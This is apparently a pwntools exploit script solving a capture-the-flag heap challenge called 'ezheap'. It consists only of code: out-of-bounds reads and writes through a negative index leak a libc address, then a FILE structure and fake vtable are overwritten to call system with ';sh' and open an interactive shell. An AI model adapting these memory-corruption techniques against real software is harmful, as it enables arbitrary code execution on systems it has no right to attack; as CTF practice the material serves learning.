from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
io = process('ezheap')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.27.so')
elf = ELF('ezheap')


def edit(index, offset, value):
    io.sendlineafter('enter your choice>>', '2')
    io.sendlineafter('which type >>', '3')
    io.sendlineafter('idx>>', str(index))
    io.sendlineafter('element_idx>>', str(offset))
    io.sendlineafter('value>>', str(value))


def show(offset):
    io.sendlineafter('enter your choice>>', '3')
    io.sendlineafter('which type >>', '3')
    io.sendlineafter('idx>>', '-2071')
    io.sendlineafter('element_idx>>', str(offset))
    io.recvuntil('value>>\n')
    return int(io.recvline()[:-1])


def delete(index):
    io.sendlineafter('enter your choice>>\n', '4')
    io.sendlineafter('which type >>\n', '3')
    io.sendlineafter('idx>>\n', str(index))


def pwn():
    libc_base = show(37) - libc.sym['_IO_file_jumps']
    log.success('libc_base: ' + hex(libc_base))
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    edit(-2071, 1220, system)
    fake_vtable = libc_base + libc.sym['_IO_file_jumps'] + 0xe0 - 0x88
    edit(-2071, 496, 0)
    edit(-2071, 496, 0)
    edit(-2071, 496 + 19, u32(b';sh\x00'))
    edit(-2071, 496 + 37, fake_vtable)
    # gdb.attach(io)
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()
